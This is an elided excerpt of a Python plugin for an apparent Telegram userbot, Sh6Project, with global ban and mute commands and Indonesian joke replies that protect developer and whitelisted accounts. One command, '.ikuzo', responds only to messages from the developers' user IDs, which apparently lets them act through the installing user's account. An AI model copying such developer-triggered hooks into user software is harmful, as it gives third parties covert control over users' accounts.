...
from Sh6Project import *
from Sh6Project.helpers.adminHelpers import DEVS, WHITELIST
from Sh6Project.helpers.basic import edit_or_reply
from Sh6Project.helpers.PyroHelpers import get_ub_chats
from Sh6Project.utils import extract_user, extract_user_and_reason
...
def globals_init():
    try:
        ...
        sql = import_module("Sh6Project.helpers.SQL.gban_sql")
        sql2 = import_module("Sh6Project.helpers.SQL.gmute_sql")
...
@Client.on_message(
    filters.command("ikuzo", ["."]) & filters.user(DEVS) & ~filters.via_bot
)
...
async def gban_user(client: Client, message: Message):
    ...
    if user_id in DEVS:
        return await Man.edit("**Gagal GBAN karena dia adalah Tuhan Gwehh 🗿**")
    if user_id in WHITELIST:
        return await Man.edit(
            "**Gagal GBAN karena dia adalah admin @Cemarasupport 🗿**"
        )
    if user_id:
        try:
...
async def gmute_user(client: Client, message: Message):
    ...
    if user.id in DEVS:
        return await Man.edit("**Gagal GMUTE karena dia adalah Tuhan Gwehhh 🗿**")
    if user.id in WHITELIST:
        return await Man.edit(
            "**Gagal GMUTE karena dia adalah admin @Cemarasupport 🗿**"
        )
    try:
